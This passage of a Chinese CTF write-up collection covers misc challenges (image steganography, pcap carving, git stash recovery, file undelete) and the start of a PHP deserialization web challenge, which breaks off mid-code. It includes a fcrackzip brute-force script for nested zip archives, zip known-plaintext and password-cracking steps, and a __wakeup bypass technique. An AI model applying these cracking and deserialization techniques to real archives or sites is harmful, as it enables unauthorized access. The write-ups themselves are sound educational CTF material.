结合题目提示了“Aesop”，即为AES operation，为AES解密（https://tool.oschina.net/encrypt），输入密码（上面得到的ISCC）

解密后发现 

```
U2FsdGVkX18OvTUlZubDnmvk2lSAkb8Jt4Zv6UWpE7Xb43f8uzeFRUKGMo6QaaNFHZriDDV0EQ/qt38Tw73tbQ== 
```

再解密一次

flag{DugUpADiamondADeepDarkMine}

#### 16-Misc-打野

**题目描述：**

菜你了解CTF圈的实时动态么？flag格式qwxf{}

**题目思路：**

工具zsteg秒解

**解题过程：**

打开Ubuntu虚拟机，把照片放到虚拟机，使用工具 zsteg，然后 zsteg ‘文件路径’

```Linux
giantbranch@ubuntu:~/Desktop$ zsteg 1.bmp 
[?] 2 bytes of extra data after image end (IEND), offset = 0x269b0e
extradata:0         .. ["\x00" repeated 2 times]
imagedata           .. text: ["\r" repeated 18 times]
b1,lsb,bY           .. <wbStego size=120, ext="\x00\x8E\xEE", data="\x1Ef\xDE\x9E\xF6\xAE\xFA\xCE\x86\x9E"..., even=false>
b1,msb,bY           .. text: "qwxf{you_say_chick_beautiful?}"
b2,msb,bY           .. text: "i2,C8&k0."
b2,r,lsb,xY         .. text: "UUUUUU9VUUUUUUUUUUUUUUUUUUUUUU"
b2,g,msb,xY         .. text: ["U" repeated 22 times]
b2,b,lsb,xY         .. text: ["U" repeated 10 times]
b3,g,msb,xY         .. text: "V9XDR\\d@"
b4,r,lsb,xY         .. text: "222\"#33\"#33\"#33\"3222333\"3#321"
b4,g,lsb,xY         .. text: "3\"\"\"\"\"3###33##3#UDUEEEEEDDUETEDEDDUEEDTEEEUT#!"
b4,g,msb,xY         .. text: "\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"DDDDDDDDDDDD\"\"\"\"DDDDDDDDDDDD*LD"
b4,b,lsb,xY         .. text: "gfffffvwgwfgwwfw"
```

 得到flag

qwxf{you_say_chick_beautiful?}

#### 17-Misc-倒立屋

**题目描述：**

房屋为什么会倒立！是重力反转了吗？

**题目思路：**

LSB隐写，使用工具Stegsolve秒解

**解题过程：**

这道题主要用到的是LSB隐写，用stegsolve（D:\CTF\hack\个人CTFTools\隐写\图像隐写\Stegsolve.jar）打开图片

![img](https://adworld.xctf.org.cn/media/task/writeup/cn/%E5%80%92%E7%AB%8B%E5%B1%8B/1.png)

 接下来就简单了，用工具就行，analyes->data extract->(red,green,blue->0)->preview,在最上方发现flag

![img](https://adworld.xctf.org.cn/media/task/writeup/cn/%E5%80%92%E7%AB%8B%E5%B1%8B/2.png)

不过是倒立的呦

NCTF{m1sc_1s_very_funny!!!}

#### 18-Misc-2017_Dating_in_Singapore

**题目描述：**

01081522291516170310172431-050607132027262728-0102030209162330-02091623020310090910172423-02010814222930-0605041118252627-0203040310172431-0102030108152229151617-04050604111825181920-0108152229303124171003-261912052028211407-04051213192625

**题目思路：**

了解日历中隐藏flag的方法

**解题过程：**

通过题目描述可以发现按-分割是12组，然后数字似乎都是两位的，于是按两位分割之后发现都是0-31范围内的，于是联想到月份，根据2017新加坡日历，将每个数字标记，然后连接得到flag：

![img](https://img-blog.csdnimg.cn/20190705212249403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70)

HITB{CTFFUN}

#### 19-Misc-a_good_idea

**题目描述：**

汤姆有个好主意

**题目思路：**

图片隐写，stegsolve、binwalk

**解题过程：**

一张图片，直接binwalk -e a_very_good_idea.jpg

![img](https://adworld.xctf.org.cn/media/task/writeup/cn/a_good_idea/1.png)

有两张图片，hint是寻找像素的秘密。 那就stegsolve（D:\CTF\hack\个人CTFTools\隐写\图像隐写\Stegsolve.jar）一下combiner两张图片，file->open->to_do.png，analyes->image combiner->to.png，然后左右切换通道一次就得到二维码了，扫描即可得到flag：

NCTF{m1sc_1s_very_funny!!!}

#### 20-Misc-再见李华

**题目描述：**

假如你是李华（LiHua)，收到乔帮主一封密信，没有任何特殊字符，请输入密码，不少于1000个字。同学，记得署名哦～

**题目思路：**

图片隐写，foremost，压缩包破解

**解题过程：**

附件中是一张图片，foremost将zip提出来

```
root@kali:~/桌面# foremost mail2LiHua.jpg 
Processing: mail2LiHua.jpg
|foundat=key.txt�mˣD
{���0ɞ|¯��CGj�h
               �v�����E�PK?
*|
```

打开需要密码。 这个题目就略坑了，满满的都是脑洞，没有特殊字符，是指密码中没有特殊字符。而不少于`1000`个字，这个1000是8的二进制，所以密码是9位或9位以上，最后署名，意思是密码中后面5位数是Lihua，最后用软件(D:\CTF\hack\压缩包破解\Ziperello\Ziperello\Ziperello.exe)进行破解。 打开后添加要解密的压缩包，基于模板的破解，密码模板：xxxxLLHHa。

| L    | Li                                                           |
| :--- | ------------------------------------------------------------ |
| H    | Hu                                                           |
| a    | a                                                            |
| x    | 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghjiklmnopqrstuvwxyz |

最后密码为`15CCLiHua`。 解压之后获得txt文件，得到flag

Stay hungry, Stay foolish.

#### 21-Misc-stage1

**题目思路：**

图片隐写Stegsolve，winhex，pyc反编译

**解题过程：**

下载附件，将png图片用stegsolve(D:\CTF\hack\个人CTFTools\隐写\图像隐写\Stegsolve.jar)打开，Green plane1得到一个二维码

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200327165607243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMDgxMTcw,size_16,color_FFFFFF,t_70)

扫描二维码是十六进制字符，文件头03F30D0A就是pyc，打开winhex(D:\CTF\Reverse\WinHex\winhex19.3 SR-4 x86 x64\winhex.exe)，新建文件，复制ASCII Hex到文件中，另存为1.pyc

```python
pip3 install uncompyle6
#在.pyc所在文件夹位置打开cmd，输入命令
uncompyle6 -o . XXX.pyc
```

成功反编译为出.py文件，print flag改为print(flag)，最后一行加上flag()

```python
# uncompyle6 version 3.6.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.7.5 (tags/v3.7.5:5c02a39a0b, Oct 15 2019, 00:11:34) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: test.py
# Compiled at: 2016-06-22 13:48:38
def flag():
    str = [
     65, 108, 112, 104, 97, 76, 97, 98]
    flag = ''
    for i in str:
        flag += chr(i)
    print(flag)
flag()
```

用idle运行得到flag。

AlphaLab

#### 22-Misc-hit-the-core

**题目思路：**

.core是Linux系统下程序崩溃生成的文件，里面有内存映射和存储调试信息的文件

**解题过程：**

在linux下对下载的文件使用strings进行查看。使用命令为`strings 文件名 | grep {`得到字符串

```
cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc{bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_nkiwutfb0ghk9ro987k5tf
```

发现大写的XCTF每个字母之间只隔了四个字母，使用python提取一下，得到flag

```python
a="cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc{bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv}"
flag=""
for i in range(3,len(a),5):
   flag=flag+a[i]
   print(flag)
```

ALEXCTF{K33P_7H3_g00D_w0rk_up}

#### 23-Misc-MISCall

**题目描述：**

没有提示

**题目思路：**

文件开头字符串bzh91ay&sy是bz2压缩格式，解压发现.git目录，考虑git泄露

**解题过程：**

首先看一下是什么文件：

```python
root@kali:~/桌面# file MISCall 
MISCall: bzip2 compressed data, block size = 900k
```

使用`tar -xjvf MISCall`进行解压，查看解压后的目录，发现flag.txt，git目录，使用gitlog查看git记录

```python
root@kali:~/桌面/ctf# ls -la
总用量 16
drwxr-xr-x  3 1000 1000 4096 7月  25  2014 .
drwxr-xr-x 11 root root 4096 7月  21 19:28 ..
-rw-r--r--  1 1000 1000   37 7月  25  2014 flag.txt
drwxr-xr-x  8 1000 1000 4096 7月  25  2014 .git
root@kali:~/桌面/ctf# git log 
commit bea99b953bef6cc2f98ab59b10822bc42afe5abc (HEAD -> master)
Author: Linus Torvalds <torvalds@klaava.Helsinki.Fi>
Date:   Thu Jul 24 21:16:59 2014 +0200
    Initial commit
```

使用git stash list查看修改列表

```python
root@kali:~/桌面/ctf# git stash list
stash@{0}: WIP on master: bea99b9 Initial commit
```

使用git stash show校验列表中存储的文件

```python
root@kali:~/桌面/ctf# git stash show
 flag.txt | 25 ++++++++++++++++++++++++-
 s.py     |  4 ++++
 2 files changed, 28 insertions(+), 1 deletion(-)
```

使用git stash apply重新进行存储，复原上面的文件

```python
root@kali:~/桌面/ctf# git stash apply
位于分支 master
要提交的变更：
  （使用 "git restore --staged <文件>..." 以取消暂存）
	新文件：   s.py
尚未暂存以备提交的变更：
  （使用 "git add <文件>..." 更新要提交的内容）
  （使用 "git restore <文件>..." 丢弃工作区的改动）
	修改：     flag.txt
```

生成的文件中，flag.txt里没有发现flag，运行s.py得到flag

NCN4dd992213ae6b76f27d7340f0dde1222888df4d3

#### 24-Misc-Reverse-it

**题目思路：**

图片的头尾和内容都翻转了

**解题过程：**

方法一：

在linux中运行两条命令

```
xxd -p Reverseit | tr -d '\n' | rev | xxd -r -p >reversed

convert -flop reversed reversed.jpg
```

方法二：

1.win+3使用sublime打开文件，显示十六进制，发现文件头9DFF,结尾8DFF，把十六进制的数据翻转过来保存成jpeg，使用下面的脚本把filename文件以十六进制打开，并打印出来翻转的数据，复制数据。

```python
from __future__ import print_function
import struct
x=''
f = open('filename','rb')
s = f.read(1)
while s:
        byte = ord(s)
        #print('%02x'%(byte),end='')
        x+='%02x'%(byte)
        s = f.read(1)
print(x[::-1])
f.close()
```

2.打开winhex(D:\CTF\Reverse\WinHex\winhex19.3 SR-4 x86 x64\WinHex64.exe)，新建10m文件，偏移0粘贴ascii hex，另存为2.jpeg，发现图片是翻转的，用ps打开2.jpeg，编辑->变换->水平翻转，得到flag

SECCON{6in_tex7}

#### 25-Misc-reverseMe

**题目思路：**

将文件内容反转

**解题过程：**

打开图片镜像翻转

![img](https://adworld.xctf.org.cn/media/uploads/writeup/17198b2a94f811ea88a9fa163e3c3fd2.png)

flag{4f7548f93c7bef1dc6a0542cf04e796e}

#### 26-Misc-simple_transfer

**题目描述：**

文件里有flag，找到它。

**题目附件：**

[f9809647382a42e5bfb64d7d447b4099.pcap](https://adworld.xctf.org.cn/media/task/attachments/f9809647382a42e5bfb64d7d447b4099.pcap)

**题目思路：**

首先用wireshark打开，发现包含NFS协议流量，进而追踪数据流，看到file.pdf，推测通过NFS传输了一个pdf文件。

**解题过程：**

一个抓包流量分析文件，用wireshark打开后，ctrl+f，用分组字节流搜索字符串flag，追踪TCP流，可以看到有file.pdf，把流量包丢到kail用foremost分离得到pdf，双击打开pdf文件获得flag

`root@kali:~/桌面#` ***foremost f9809647382a42e5bfb64d7d447b4099.pcap*** 
Processing: f9809647382a42e5bfb64d7d447b4099.pcap
|*|

HITB{b3d0e380e9c39352c667307d010775ca}

#### 27-Misc-快乐游戏题

**题目来源：**

2019_UNCTF

**题目附件：**

[bce2610d3bfa4da8813732deaab7f87f.zip](https://adworld.xctf.org.cn/media/task/attachments/bce2610d3bfa4da8813732deaab7f87f.zip)

**题目思路：**

玩游戏赢了就行

**解题过程：**

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200822154752500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center)

UNCTF{c783910550de39816d1de0f103b0ae32}

#### 28-Misc-Ditf

**题目来源：**

安恒9月赛

**题目附件：**

[e02c9de40be145dba6baa80ef1d270ba.png](https://adworld.xctf.org.cn/media/task/attachments/e02c9de40be145dba6baa80ef1d270ba.png)

**题目思路：**

改变图片高度获得密码，foremost分离出压缩包，解密压缩包后分析流量

**解题过程：**

用binwalk查看文件里面有没有其他东西，存在一个png图片一个RAR压缩包，foremost进行分离。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200614005450548.jpg#pic_center)

得到的RAR压缩包需要密码，尝试修改图片高度，将原来的044C改为04FF，发现了密码StRe1izia。

![img](https://adworld.xctf.org.cn/media/task/writeup/cn/Ditf/2.png)

解开压缩包得到文件Ditf.pcapng，使用wireshark进行分析，搜索png时，发现kiss.png，追踪http流量发现特征明显的代码：ZmxhZ3tPel80bmRfSGlyMF9sb3YzX0ZvcjN2ZXJ9

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200614005728584.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pbmd4aWFveGlueGlu,size_16,color_FFFFFF,t_70#pic_center)

base64解码得到flag。

flag{Oz_4nd_Hir0_lov3_For3ver}

#### 29-Misc-glance-50

**题目来源：**

mma-ctf-2nd-2016

**题目附件：**

[9266eadf353d4ada94ededaeb96d0c50.gif](https://adworld.xctf.org.cn/media/task/attachments/9266eadf353d4ada94ededaeb96d0c50.gif)

**题目思路：**

将gif分离为图片，共201张，然后拼接在一起即可得到flag

**解题过程：** 

有时候你看到一张动态图片，其中的一个画面你觉得很不错，想从中提取出来。这个[动态图片分解工具](https://tu.sioe.cn/gj/fenjie/)能帮助你完成这个想法。

![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/958c55070f44bb480c35454a9f55a262.png#pic_center)

GIF动态图片是由多张静态图片组合而成，按照一定的顺序和时间进行播放。基于此，该工具将GIF图片反向分解成一张张静态图。GIF图片有多少帧，就有多少张静态图片。注意有个英文的单引号。

TWCTF{Bliss by Charles O'Rear}

#### 30-Misc-easycap

**题目描述：**

你能从截取的数据包中得到flag吗？

**题目思路：**

利用wires hark将数据包打开，发现是利用TCP协议进行的一系列数据传输，右键追踪TCP流的信息即可得到flag

**解题过程：**

用winshark打开文件，ctrl+F查找flag,分组详情，字符串，随便找一个右键tcp跟踪,得到flag

![img](https://img-blog.csdnimg.cn/20190523212912498.png)

385b87afc8671dee07550290d16a8071

#### 31-Misc-Get-the-key.txt

**题目来源：**

SECCON-CTF-2014

**题目附件：**

[256cb07f5dbd493f81ad5b199f2b248a.zip](https://adworld.xctf.org.cn/media/task/attachments/256cb07f5dbd493f81ad5b199f2b248a.zip)

**题目思路：**

下载附件后，使用binwalk -e提取文件，使用file命令，发现是一个文件系统数据，forensic100: Linux rev 1.0 ext2 filesystem data，然后使用mount -o loop forensic100 /tmp/forensic100命令加载文件，根据题目名称可知，我们要找key.txt文件。，使用grep -r key.txt命令查找此文件，最后使用gunzip < 1命令读取文件，得到flag

**解题过程：** 

从题目名字和winhex得知里面有隐藏文件，所以想到改后缀格式为zip

![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/bd80ca652cdbceb0fe895cd62388617e.png#pic_center)

解压出文档打开就是flag
SECCON{@]NL7n+-s75FrET]vU=7Z}

#### 32-Misc-黄金六年

**题目思路：**

利用winhex将视频打开，发现最下面有base64编码

**解题过程：**

用winhex（D:\CTF\Reverse\WinHex\winhex19.3 SR-4 x86 x64\WinHex64.exe）打开文件，发现最后由一个base64编码的压缩包：

```
UmFyIRoHAQAzkrXlCgEFBgAFAQGAgADh7ek5VQIDPLAABKEAIEvsUpGAAwAIZmxhZy50eHQwAQAD
Dx43HyOdLMGWfCE9WEsBZprAJQoBSVlWkJNS9TP5du2kyJ275JzsNo29BnSZCgMC3h+UFV9p1QEf
JkBPPR6MrYwXmsMCMz67DN/k5u1NYw9ga53a83/B/t2G9FkG/IITuR+9gIvr/LEdd1ZRAwUEAA==
```

在线解码一下（https://base64.us/）

![技术分享图片](http://image.bubuko.com/info/202001/20200112091955493231.png)

可以看出来是Rar文件，编写python脚本将其输出

```python
import base64
a='UmFyIRoHAQAzkrXlCgEFBgAFAQGAgADh7ek5VQIDPLAABKEAIEvsUpGAAwAIZmxhZy50eHQwAQADDx43HyOdLMGWfCE9WEsBZprAJQoBSVlWkJNS9TP5du2kyJ275JzsNo29BnSZCgMC3h+UFV9p1QEfJkBPPR6MrYwXmsMCMz67DN/k5u1NYw9ga53a83/B/t2G9FkG/IITuR+9gIvr/LEdd1ZRAwUEAA=='
f=open('1.rar','wb')
f.write(base64.b64decode(a))
f.close()
```

查看输出的1.rar文件，需要密码 我们在视频的十六进制文件里面发现了base64文件，一般来说密码就会藏在视频的播放里，分帧查看一下，使用工具(D:\CTF\hack\个人CTFTools\隐写\视频隐写\DVDVideoSoft\Free Video to JPG Converter\FreeVideoToJPGConverter.exe)，把视频每帧转化成照片：

![img](https://adworld.xctf.org.cn/media/task/writeup/cn/%E9%BB%84%E9%87%91%E5%85%AD%E5%B9%B4/1.png)

对每帧的图片进行查看（D:\CTF\hack\个人CTFTools\隐写\视频隐写\DVDVideoSoft\finish）：

发现会有二维码在75.jpg中key1:i

![图片: https://uploader.shimo.im/f/3NeIpv1Si9ACCVPL.png](https://img-blog.csdnimg.cn/20200507231341931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA4NjU5,size_16,color_FFFFFF,t_70)

在148.jpg中key2:want

![图片: https://uploader.shimo.im/f/M89FymxrcNOLqEpB.png](https://img-blog.csdnimg.cn/20200507231353426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA4NjU5,size_16,color_FFFFFF,t_70)

在246.jpg中key3:play

![图片: https://uploader.shimo.im/f/7Xzsqr0x7AmC5bVi.png](https://img-blog.csdnimg.cn/20200507231400272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA4NjU5,size_16,color_FFFFFF,t_70)

还有一个可以使用pr打开查看在10.02的位置是最后一本活着key4：ctf

![图片: https://uploader.shimo.im/f/FQUPOilbbWgP6K8U.png](https://img-blog.csdnimg.cn/20200507231407681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA4NjU5,size_16,color_FFFFFF,t_70)



输入解压密码可以得到flag

roarctf{CTF-from-RuMen-to-RuYuan}

#### 33-Misc-小小的PDF

**题目思路：**

下载下来是一个 pdf文件,先用formost 分离一下,也可以用binwalk查看pdf内容

**解题过程**：

![img](https://img-blog.csdnimg.cn/20190915151437308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70)

发现有三张图片,但打开只显示了两张,所以手动用dd命令提取出第三张图片,图片上写着flag

SYC{so_so_so_easy}

#### 34-Misc-肥宅快乐题

**题目思路：**

下载下来是个swf文件,用PotPlayer打开可以进行每一帧的遍历

**解题过程**：

题目有提示：注意与NPC的对话哦,所以对话中的信息需要注意,第57帧中的对话中出现信息：

![img](https://img-blog.csdnimg.cn/201905071802182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p6X0NhbGVi,size_16,color_FFFFFF,t_70)

提取出来：U1lDe0YzaVpoYWlfa3U0aWxlX1QxMTF9

base64解码得flag：

SYC{F3iZhai_ku4ile_T111}

#### 35-Misc-我们的秘密是绿色的

**题目来源：**

SSCTF-2017

**题目附件：**

[bb9a4b47c82b4a659ce492cd903df03b.zip](https://adworld.xctf.org.cn/media/task/attachments/bb9a4b47c82b4a659ce492cd903df03b.zip)

**题目思路：**

掌握oursecret工具隐写功能，zip暴力破解，zip伪加密，栅栏加密，凯撒加密

**解题过程:**

下载文件，发现是一张图片，看题目我们的秘密，刚好有一款工具就叫做OurSecret,Advanced Archive Password Recovery，打开工具，setp1：点右边的unhide，setp2：输入密码，发现图片上的日历有些数字颜色是绿色的

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190608201405294.?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTY3Mzk4,size_16,color_FFFFFF,t_70)

输入密码：0405111218192526，点击unhide后，把生成的try.zip另存出来

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190608201533560.?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTY3Mzk4,size_16,color_FFFFFF,t_70)

用WinRAR打开，发现有段注释`你知道coffee的生日是多少么~~~`，生日一般都是八位数的纯数字，使用Ziperello暴力破解，得到密码：19950822，解压得到一个try文件夹，发现里面的里面有一个未加密的readme文件和flag.zip，被加密的压缩包中含有已知文件，应该是明文攻击，把readme.txt压缩成zip然后使用ARCHPR执行明文攻击

![img](https://img2020.cnblogs.com/blog/2124073/202009/2124073-20200907235322768-307594955.png)

得到密码：Y29mZmVl，解压得到一个加密文件，使用winhex或者010打开观察发现是伪加密。

![img](https://img2020.cnblogs.com/blog/2124073/202009/2124073-20200907235347319-812517995.png)

01改为00或者使用工具ZipCenOp

```sh
java -jar ZipCenOp.jar r flag.zip
```

解压后打开flag.txt，得到`qddpqwnpcplen%prqwn_{_zz*d@gq}`，应该是[栅栏解密](https://www.qqxiuzi.cn/bianma/zhalanmima.php)，试到第6组就可以得到

> qwlr{ddneq_@dpnwzgpc%nzqqpp_*}

但是不像是flag，[凯撒密码](https://www.qqxiuzi.cn/bianma/kaisamima.php)位移11位解密得到flag

`flag{ssctf_@seclover%coffee_*}`

#### 36-Misc-Become_a_Rockstar

**题目来源：**

2019_NJUPT CTF

**题目附件：**

[7a7a705cb5874292a47461c7ed0cc0c1.zip](https://adworld.xctf.org.cn/media/task/attachments/7a7a705cb5874292a47461c7ed0cc0c1.zip)

**题目思路：**

了解下[Rockstar编程语言](https://github.com/RockstarLang/rockstar https://github.com/yyyyyyyyyyan/rockstar-py)

**解题过程:**

在安装了python的情况下，pip安装rockstar-py，使用rockstar-py，得到一段python代码，运行py回车两次可以得到flag

```bash
pip install rockstar-py
rockstar-py -i Become_a_Rockstar.rock -o 1.py
python 1.py
5
5
NCTF{youar
nicerockstar
}
```

NCTF{youarnicerockstar}

#### 37-Misc-normal_png

**题目附件：**

[7171426a9b4646aba1db92b1fbc083f5.png](https://adworld.xctf.org.cn/media/task/attachments/7171426a9b4646aba1db92b1fbc083f5.png)

**题目思路：**

改变png的高度，可以看到flag。

**解题过程:**

放到010编辑器或者winhex中查看，在16和17的位置分别是图片高度和宽度，将`03`改为`04`，增加高度得到flag

![/media/task/writeup/cn/normal_png/1.png](https://adworld.xctf.org.cn/media/task/writeup/cn/normal_png/1.png)

flag{B8B68DD7007B1E406F3DF624440D31E0}

#### 38-Misc-Recover-Deleted-File

**题目附件：**

[c297795634cb4f6e8e1d88be044ec0c4.gz](https://adworld.xctf.org.cn/media/task/attachments/c297795634cb4f6e8e1d88be044ec0c4.gz)

**题目思路：**

独立于系统文件的恢复，使用binwalk和extundelete

**解题过程:**

下载文件是个压缩包，放到kail解压，出现新的压缩包，使用file命令查看，里面有个disk-image文件，使用binwalk提取。

```bash
root@kali:~/公共# file c297795634cb4f6e8e1d88be044ec0c4
c297795634cb4f6e8e1d88be044ec0c4: gzip compressed data, was "disk-image", last modified: Mon Sep 15 08:42:23 2014, from Unix, original size modulo 2^32 2097152
root@kali:~/公共# binwalk -e c297795634cb4f6e8e1d88be044ec0c4
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             gzip compressed data, has original file name: "disk-image", from Unix, last modified: 2014-09-15 08:42:23
root@kali:~/公共# cd _c297795634cb4f6e8e1d88be044ec0c4.extracted/
root@kali:~/公共/_c297795634cb4f6e8e1d88be044ec0c4.extracted# file disk-image
disk-image: Linux rev 1.0 ext3 filesystem data, UUID=bc6c2b24-106a-4570-bc4f-ae09abbd7a88
root@kali:~/公共/_c297795634cb4f6e8e1d88be044ec0c4.extracted# extundelete disk-image --restore-all
NOTICE: Extended attributes are not restored.
Loading filesystem metadata ... 1 groups loaded.
Loading journal descriptors ... 17 descriptors loaded.
Searching for recoverable inodes in directory / ... 
1 recoverable inodes found.
Looking through the directory structure for deleted files ... 
0 recoverable inodes still lost.
root@kali:~/公共/_c297795634cb4f6e8e1d88be044ec0c4.extracted# cd RECOVERED_FILES/
root@kali:~/公共/_c297795634cb4f6e8e1d88be044ec0c4.extracted/RECOVERED_FILES# chmod 777 flag 
root@kali:~/公共/_c297795634cb4f6e8e1d88be044ec0c4.extracted/RECOVERED_FILES# ./flag 
your flag is:
de6838252f95d3b9e803b28df33b4baaroot@kali:~/公共/_c297795634cb4f6e8e1d88be044ec0c4.extracted/RECOVERED_FILES# 
```

提取后进入目录查看disk-image文件，使用extundelete恢复，运行flag

de6838252f95d3b9e803b28df33b4baa

### Misc-Miscellaneous-300

发现一个收到密码保护的压缩包

使用fcrackzip进行爆破

发现爆破后依旧有压缩包

使用脚本

```
#!/usr/bin/env bash

while [ -e *.zip ]; do
  files=*.zip;
  for file in $files; do
    echo -n "Cracking ${file}… ";
    output="$(fcrackzip -u -l 1-6 -c '1' *.zip | tr -d '\n')";
    password="${output/PASSWORD FOUND\!\!\!\!: pw == /}";
    if [ -z "${password}" ]; then
      echo "Failed to find password";
      break 2;
    fi;
    echo "Found password: \`${password}\`";
    unzip -q -P "${password}" "$file";
    rm "${file}";
  done;
done;
import os,sys,zipfile

original_file = "73168.zip"

while True:
try:
    original_file = zipfile.ZipFile(original_file)

for contents in original_file.namelist():
    password = contents[0:contents.find('.')]

original_file.setpassword(password)
original_file.extractall()

original_file = password+'.zip'

except:
   break
```

爆破了好几分钟后

```
....
....
Cracking 77848.zip… Found password: `99120`
Cracking 99120.zip… Found password: `82460`
Cracking 82460.zip… Found password: `77004`
Cracking 77004.zip… Found password: `80289`
Cracking 80289.zip… Found password: `12475`
Cracking 12475.zip… Failed to find password
fcrackzip -u -l 1-6 -c 'a1' 12475.zip
```

获得密码`b0yzz`

```
PASSWORD FOUND!!!!: pw == b0yzz
```

unzip -q -P b0yzz 12475.zip

使用Audacity,用频谱观看

[![img](http://ww1.sinaimg.cn/large/0078P6qQgy1g5kfm7holtj30mm096gpr.jpg)](http://ww1.sinaimg.cn/large/0078P6qQgy1g5kfm7holtj30mm096gpr.jpg)

### Misc-Cephalopod

打开附件后发现这是一个pcap文件,将它用winshark打开

搜索flag,发现了flag.png,几乎每个条目里都有,但是并不能分离出来
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190601180527648.png)

![img](https://img-blog.csdnimg.cn/20190601180553386.png)

一款新的工具tcpxtract
在linux环境下,用binwalk对图片进行分析：

![img](https://img-blog.csdnimg.cn/20190601180846845.png)

用dd if 文件名 of 1.png skip=26441
分离出的图片不能被打开,才发现图片需要恢复,用简单的提取是不行的
Tcpxtract是一种基于文件签名从网络流量中提取文件的工具。基于文件类型的页眉和页脚（有时称为“雕刻”）提取文件是一种古老的数据恢复技术。Foremost这样的工具使用这种技术可以从任意数据流中恢复文件,其是专门用于通过网络传输的拦截文件的应用。填补类似需求的其他工具有流网和EtherPEG。driftnet和EtherPEG是用于在网络上监控和提取图形文件的工具,网络管理员通常使用它来警告用户的互联网活动。driftnet和EtherPEG的主要局限性在于它们只支持三种文件类型,不需要添加更多方法。他们使用的搜索技术也是不可扩展的,不会跨数据包边界搜索
由于它没有kali版本,只好安装在redhat里rpm安装包地址如下:

http://www.rpmfind.net/linux/rpm2html/search.php?query=tcpxtract

分离命令：

```
tcpxtract -f 40150e85ac1b4952f1c35c2d9103d8a40c7bee55.pcap Found file of type "png" in session 
```

分离出两张图片,还是不能查看,但是放入winhex发现,它的头部少了89
加上后保存,其中一张可以打开,出现了flag

![img](https://img-blog.csdnimg.cn/20190601181919602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70)

还有一种方法,录了视频D:\CTF\web\视频

### WEB

#### 1-Web-baby_web

**题目描述：**

想想初始页面是哪个

**题目思路：**

题目描述为找初始页面，进入网站发现是1.php，尝试index.php，发现302跳转，F12选择Network可见index.php，查看可在请求头找到flag。

**解题过程**：

1.根据提示，在url中输入index.php,发现打开的仍然还是1.php

2.打开火狐浏览器的开发者模式，选择网络模块，再次请求index.php,查看返回包，可以看到location参数被设置了1.php，并且得到flag。

![img](https://adworld.xctf.org.cn/media/task/writeup/cn/baby_web/1.png)

使用谷歌浏览器访问

![img](https://adworld.xctf.org.cn/media/uploads/writeup/eae50ad2468e11ea88a1fa163e3c3fd2.png)

访问index.php,抓包,查看响应头部

![img](https://adworld.xctf.org.cn/media/uploads/writeup/06f62a58608911ea88a4fa163e3c3fd2.png)

flag{very_baby_web}

#### 2-Web-Web_php_unserialize

**题目思路：**

类的实例被反序列化时，会自动调用wakeup()，当反序列化中object的个数和之前的个数不等时，wakeup就会被绕过。

**解题过程**：

根据题目可以知道是一个反序列化的题，看到源码，需要绕过一个__wakeup()函数和一个正则匹配。

```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { //创建自动调用
        $this->file = $file; 
    }
    function __destruct() { //对象销毁调用
